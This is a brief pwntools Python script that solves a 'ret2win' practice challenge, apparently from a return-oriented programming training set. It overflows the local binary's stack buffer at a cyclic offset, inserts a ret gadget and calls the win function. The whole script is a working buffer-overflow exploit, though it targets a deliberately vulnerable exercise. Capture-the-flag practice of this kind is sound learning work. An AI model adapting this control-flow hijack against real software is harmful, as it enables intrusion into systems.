#!/usr/bin/env python
from pwn import *

elf = context.binary = ELF("./ret2win")
rop = ROP(elf)

rop.raw(b"A" * cyclic_find(0x6161616161616166, n=8))
rop.raw(rop.ret.address)
rop.call('ret2win', [])

log.info(rop.dump())

p = elf.process()
p.sendline(rop.chain())

log.success(p.recvall().decode().strip())
